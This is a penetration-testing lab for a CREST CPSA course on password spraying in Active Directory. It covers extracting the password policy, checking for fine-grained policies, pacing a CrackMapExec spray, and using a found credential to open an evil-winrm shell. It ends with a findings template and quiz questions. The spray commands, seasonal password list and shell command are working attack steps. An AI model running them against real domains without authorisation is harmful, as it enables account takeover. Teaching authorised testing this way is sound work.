Lab E4-B: Password Policy, Spraying and Account Lockout

Module E Active Directory CREST CPSA CPSA Ref: E4 Difficulty: Intermediate Estimated time: 45 min
Windows Attack Chain - Where You Are Now
E0 Pre-flight→ E1-A SMB Enum→ E2-A Credential Access→ E3-A PrivEsc→ E3-B ACLs→ E4-A AD Enum→ E4-B Password Spray→ E5-A Kerberos→ E5-B SAM Dump→ E6-A SQL→ E7-A Patch Assessment

You have enumerated the AD structure and have a user list from E4-A. Before attempting Kerberos attacks in E5-A, you need to understand the password policy - this tells you how many attempts you have before you lock accounts and alert the SOC. This lab covers policy extraction, safe spray methodology, and what to document in findings.

Engagement Scenario

You have a domain user list from your BloodHound and LDAP enumeration in E4-A. You now need to assess the password policy in place, identify any Fine Grained Password Policies for privileged accounts, and conduct a carefully timed password spray against the user list. In a fintech environment like Syntex Solutions Ltd, triggering account lockouts is a reportable incident - you must spray within safe limits.

Learning Objectives

  • Extract the domain password policy using multiple methods
  • Identify Fine Grained Password Policies that may protect privileged accounts differently
  • Calculate a safe spray rate based on the lockout threshold
  • Execute a controlled password spray with CrackMapExec without triggering lockouts
  • Document weak password policy as a standalone CPSA finding

Extracting the Domain Password Policy

Policy Enumeration

Always extract the password policy before attempting any credential attack. This tells you the lockout threshold, observation window, and minimum password length - three values that determine your spray strategy:

# Method 1: net accounts - quick, requires only domain user access
net accounts /domain

Force user logoff how long after time expires?: Never
Minimum password age (days): 1
Maximum password age (days): 90
Minimum password length: 7
Length of password history maintained: 5
Lockout threshold: 5
Lockout duration (minutes): 30
Lockout observation window (minutes): 30
Computer role: PRIMARY

# Method 2: crackmapexec - works remotely from Kali, no shell required
crackmapexec smb <DC01-IP> -u svc-backup -p Password1 --pass-pol

SMB    <DC01-IP>  445  SYNTEX-DC01  [+] Dumping password info for domain: SYNTEX
SMB    <DC01-IP>  445  SYNTEX-DC01  Minimum password length: 7
SMB    <DC01-IP>  445  SYNTEX-DC01  Password history length: 5
SMB    <DC01-IP>  445  SYNTEX-DC01  Maximum password age: 90 days
SMB    <DC01-IP>  445  SYNTEX-DC01  Password Complexity Flags: 0b01
SMB    <DC01-IP>  445  SYNTEX-DC01  Domain Lockout Threshold: 5
SMB    <DC01-IP>  445  SYNTEX-DC01  Domain Lockout Duration: 30 minutes

Min Length

7 characters

FINDING: Below the Microsoft-recommended minimum of 14. Short passwords crack faster and enable more spray candidates.

Lockout Threshold

5 attempts

FINDING: 5 attempts before lockout is workable for spraying. Anything over 3 is exploitable with a controlled spray.

Max Password Age

90 days

FINDING: 90-day rotation still permits use of seasonal passwords (Winter2024!, Spring2024!). Many users cycle predictably.

Complexity

Enabled (basic)

FINDING: Basic complexity (uppercase, lowercase, digit or symbol) is met by Season+Year+! patterns - complexity alone is insufficient.

★
CREST CPSA Exam Point: A weak password policy is a standalone finding, separate from any credentials you actually crack. Document it as: insufficient minimum length (7 vs recommended 14+), insufficient lockout threshold (5 vs recommended 3 or fewer for high-privilege accounts), and absence of Fine Grained Password Policies for privileged groups. Risk rating: MEDIUM on its own; escalates to HIGH if combined with successful spray.
2

Checking for Fine Grained Password Policies

FGPP / LDAP

Fine Grained Password Policies (FGPP) allow different policies for different groups. Privileged accounts should have stricter policies. Check whether Syntex has applied any:

# Check for Fine Grained Password Policies via LDAP
ldapsearch -x -H ldap://<DC01-IP> -D "svc-backup@syntex.local" -w Password1 \
  -b "CN=Password Settings Container,CN=System,DC=syntex,DC=local" \
  "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength msDS-LockoutThreshold msDS-PSOAppliesTo

No entries found.
# No FGPP defined - all accounts use the same weak default policy
# This means Domain Admins have the SAME lockout threshold as regular users
# FINDING: Absence of FGPP for privileged accounts is a security gap
ℹ
What to look for: If FGPPs exist, check msDS-PSOAppliesTo to see which groups they protect. Domain Admins should have a lockout threshold of 3 or fewer, and a minimum password length of 15+. If standard-user policy applies to DA accounts, that is a finding.
3

Calculating a Safe Spray Rate

Spray Safety

With a lockout threshold of 5 and an observation window of 30 minutes, you must stay under 5 attempts per account within any 30-minute window. The safest approach: 1 password per account per spray, wait 31 minutes between rounds.

# Safe spray calculation for Syntex environment:
# Lockout threshold: 5 attempts
# Observation window: 30 minutes
# Safe limit: 4 attempts max (leave 1 in reserve for legitimate logon failures)
# Safe wait between rounds: 31 minutes (longer than observation window)
# Safe total passwords to try before reporting: 4 (e.g. 4 rounds x 1 password)

# Generate your target password list for the spray - seasonal patterns first
cat spray_passwords.txt
Password1
Password1!
Syntex2024!
Summer2024!
Winter2024!

# But ONLY use 1 per spray round - never spray all 5 simultaneously
⚠
Engagement Safety - Critical: In a real engagement, never spray at the lockout threshold or above. Always leave at least one attempt in reserve for legitimate user logon failures (a user locking their own account during the spray window would tip you over). For Syntex, maximum 4 attempts spread across 31-minute intervals. Log every spray attempt in your engagement notes with the timestamp - this is in the rules of engagement.
4

Password Spray with CrackMapExec

CME Spray

Execute the first spray round with one password against the full user list. Use the --no-bruteforce flag to ensure CME only tries one password per user and does not attempt multiple in a single pass:

# Build user list from E4-A LDAP enumeration
cat syntex_users.txt
administrator
jsmith
mjones
svc-backup
svc-sql
svc-monitor
hr.admin
it.admin
finance.user

# Round 1: spray Password1 - one attempt per user
crackmapexec smb <DC01-IP> -u syntex_users.txt -p 'Password1' --no-bruteforce --continue-on-success

SMB    <DC01-IP>  445  SYNTEX-DC01  [-] syntex.local\administrator:Password1
SMB    <DC01-IP>  445  SYNTEX-DC01  [-] syntex.local\jsmith:Password1
SMB    <DC01-IP>  445  SYNTEX-DC01  [-] syntex.local\mjones:Password1
SMB    <DC01-IP>  445  SYNTEX-DC01  [+] syntex.local\hr.admin:Password1 (Pwn3d!)
SMB    <DC01-IP>  445  SYNTEX-DC01  [-] syntex.local\it.admin:Password1

# hr.admin:Password1 - valid credential found, local admin on DC!

Wait 31 minutes before round 2. Document the timestamp of round 1 completion and the result before proceeding. If you found valid credentials, validate them and move on rather than continuing to spray:

# Validate the found credential before proceeding
crackmapexec smb <DC01-IP> -u hr.admin -p Password1

SMB    <DC01-IP>  445  SYNTEX-DC01  [+] syntex.local\hr.admin:Password1 (Pwn3d!)

# (Pwn3d!) means hr.admin has admin rights on this host
# Now check what groups hr.admin belongs to
crackmapexec smb <DC01-IP> -u hr.admin -p Password1 --groups

# Or use Evil-WinRM to get a shell as hr.admin
evil-winrm -i <DC01-IP> -u hr.admin -p Password1
★
CREST CPSA Exam Point: The CPSA exam may present a scenario where you must choose the correct spray approach given a specific lockout policy. Key rules: (1) never exceed threshold minus 1 per observation window; (2) use --no-bruteforce to prevent CME from looping through passwords against one account; (3) document every attempt with timestamp. If asked about account lockout observation windows, the window resets the failed attempt counter - it does not reset a locked account (that requires the lockout duration to expire or an admin unlock).
5

Documenting the Password Policy Finding

Reporting

Weak password policy is always reported as a finding regardless of whether the spray succeeded. Here is the report structure for a CPSA-level deliverable:

# Finding: Weak Domain Password Policy
# Severity: MEDIUM (standalone) / HIGH (if credentials obtained via spray)
#
# Evidence:
# - Minimum password length: 7 (recommended: 14+)
# - Lockout threshold: 5 (recommended: 3 for privileged accounts)
# - No Fine Grained Password Policy for Domain Admins
# - Maximum password age: 90 days (seasonal rotation patterns exploitable)
#
# Impact:
# - Password spray succeeded: hr.admin:Password1 (local admin on DC)
# - Trivially guessable password meets complexity requirements (contains uppercase,
#   lowercase, digit) but is in common wordlists
#
# Remediation:
# 1. Increase minimum password length to 14+ or enforce passphrases
# 2. Deploy Fine Grained Password Policy with threshold of 3 for Domain Admins
# 3. Enable Microsoft Entra Password Protection to block common patterns
# 4. Review and reset hr.admin (Syntex2024! or similar likely in use elsewhere)

Knowledge Check

Q1. A domain has a lockout threshold of 5 and an observation window of 30 minutes. What is the maximum number of spray attempts per account you should make in a 30-minute period on a real engagement?

A. 5 - the threshold is your safe limit
B. 4 - leave one attempt in reserve for legitimate login failures
C. 3 - standard practice is to stay at 60% of threshold
D. 1 - never make more than one attempt per observation window

Q2. What does the CrackMapExec --no-bruteforce flag do in a spray scenario?

When you pass a list of users and a list of passwords to CME, by default it tries every password against every user (a full bruteforce). --no-bruteforce changes this to pair-mode: it tries username1:password1, then username2:password2, etc. This means you are trying ONE password per account per run - the correct approach for a spray. Without this flag on a multi-password list, you would exceed the lockout threshold on the first few accounts immediately.

Q3. What is a Fine Grained Password Policy and why is its absence for Domain Admins a finding?

A. An FGPP is a stricter policy applied to specific groups - without one, DAs share the same weak lockout threshold as regular users
B. An FGPP is a password filter that blocks dictionary words - its absence means common passwords are accepted
C. An FGPP is a multi-factor authentication requirement - its absence means DAs can log in with just a password
D. An FGPP is a Kerberos pre-authentication setting - its absence enables AS-REP roasting of DA accounts

Key Takeaways

  • Always extract the password policy before any credential attack - never spray blind
  • Safe spray limit is threshold minus 1 per observation window - the reserve is for legitimate failures
  • Use --no-bruteforce in CME to prevent accidental multi-password bruteforce per account
  • Weak password policy is a standalone finding - document it even if the spray fails
  • Absence of Fine Grained Password Policy for privileged accounts means DAs have no extra protection
  • Season + Year + Symbol is the most common enterprise password pattern - prioritise it in spray candidates
